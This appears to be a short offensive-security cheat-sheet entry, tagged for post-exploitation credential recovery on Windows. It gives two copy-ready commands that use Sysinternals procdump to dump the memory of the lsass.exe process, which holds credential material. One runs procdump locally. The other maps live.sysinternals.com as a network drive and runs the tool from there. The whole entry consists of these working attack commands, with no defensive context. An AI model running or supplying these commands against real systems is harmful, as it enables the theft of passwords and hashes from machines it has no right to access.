# procdump

% procdump, lsass, credentials

## procdump - dump lsass - local
#platform/windows  #target/local  #cat/POSTEXPLOIT/CREDS_RECOVER 
```cmd
C:\procdump.exe -accepteula -ma lsass.exe lsass.dmp
```

## procdump - dump lsass - remote
#platform/windows  #target/local  #cat/POSTEXPLOIT/CREDS_RECOVER 
```cmd
net use Z: https://live.sysinternals.com; Z:\procdump.exe -accepteula -ma lsass.exe lsass.dmp
```
